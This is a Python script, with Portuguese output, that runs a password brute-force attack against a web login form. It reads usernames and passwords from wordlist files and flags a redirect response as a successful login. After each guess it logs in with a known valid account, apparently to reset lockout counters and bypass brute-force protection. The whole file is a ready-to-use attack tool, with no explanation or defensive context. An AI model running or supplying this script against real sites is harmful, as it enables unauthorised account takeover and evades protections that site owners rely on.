import requests, sys, pyfiglet

if len(sys.argv) <= 2:
    print("Modo de uso: python3 script.py {URL} {USER} {PASSWORD} ")
    sys.exit()
else:
    url = sys.argv[1]
    user = sys.argv[2]
    passwd = sys.argv[3]

    with open('/home/kali/user.txt', 'r') as user_file, open('/home/kali/pass.txt', 'r') as pass_file:
        usernames = user_file.readlines()
        passwords = pass_file.readlines()

    result = pyfiglet.figlet_format("bruteforce bypass", font = "digital" ) 
    print(result)
    for username, password in zip(usernames, passwords):
        username = username.strip()
        password = password.strip()
        data = {'username': username, 'password': password}
        response = requests.post(url, data=data, allow_redirects=False)
        print(f"\033[91m{username}:{password}\033[0m - Response: {response.status_code}")
        if response.status_code == 302:
            print(f"\033[92mLogin bem-sucedido! {username}:{password}\033[0m")
            break
        elif response.status_code != 200:
            print(f"\033[91mFalha na requisição. Código de status: {response.status_code}\033[0m")
            break
        data2 = {'username': user, 'password': passwd}
        response = requests.post(url, data=data2, allow_redirects=False)
        print(f"{data2['username']}:{data2['password']} - Response: {response.status_code}")
